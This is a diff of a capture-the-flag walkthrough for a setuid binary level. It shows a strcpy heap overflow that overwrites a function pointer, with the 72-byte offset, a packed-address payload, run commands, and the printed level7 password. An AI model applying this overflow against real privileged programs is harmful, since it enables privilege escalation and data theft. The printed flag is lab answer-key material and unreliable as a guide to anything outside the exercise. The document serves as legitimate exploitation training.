@@ -4,30 +4,29 @@ level6 - walkthrough
 Target: /home/user/level6/level6   (setuid + setgid level7)
 Goal:   read /home/user/level7/.pass
 
-1. Recon (objdump -d level6), main():
-     malloc(0x40)     -> buf   (64-byte buffer)          [esp+0x1c]
-     malloc(4)        -> fp    (function-pointer cell)   [esp+0x18]
-     *fp = 0x8048468  (= m, which does puts("Nope"))
-     strcpy(buf, argv[1])       ; <-- no bounds check -> heap overflow
-     eax = *fp; call *eax       ; calls through the pointer
-
+1. The bug
+   main() does:
+     buf = malloc(0x40);            ; 64-byte buffer
+     fp  = malloc(4);               ; holds a function pointer, default = m()
+     strcpy(buf, argv[1]);          ; <-- no bound -> heap overflow
+     (*fp)();                       ; calls through the pointer
    Helper functions:
      n() @ 0x08048454 : system("/bin/cat /home/user/level7/.pass")
-     m() @ 0x08048468 : puts("Nope")
+     m() @ 0x08048468 : puts("Nope")   (the default target)
 
-2. Heap layout / offset
-   buf and fp are consecutive heap chunks. With gdb:
-     buf = 0x0804a008 , fp = 0x0804a050  ->  fp - buf = 0x48 = 72 bytes.
-   So byte 72 of the input lands exactly on the function pointer.
+2. Offset
+   buf and fp are consecutive heap chunks: buf = 0x0804a008, fp = 0x0804a050,
+   so fp - buf = 0x48 = 72. Byte 72 of the input lands on the function pointer.
 
-3. Payload (passed as argv[1], so no stdin needed)
-     "A"*72 + &n
-     &n = 0x08048454 -> \x54\x84\x04\x08   (no NUL, so strcpy copies it all)
+3. Payload  (Ressources/exploit.py)
+     payload = b"A"*72 + p32(0x08048454)
+   72 filler bytes, then &n. The overflow overwrites the function pointer with
+   &n, so the indirect call runs n() instead of m().
 
-     $ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+4. Run
+     $ python3 Ressources/exploit.py
+     $ ./level6 "$(cat payload)"
+   n() cats the level7 password directly -- no shell needed.
 
-   strcpy overflows buf, overwrites fp with &n, and `call *fp` runs
-   n() -> the level7 password is printed.
-
-4. Result -- level7 password:
+5. Result -- level7 password:
    f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
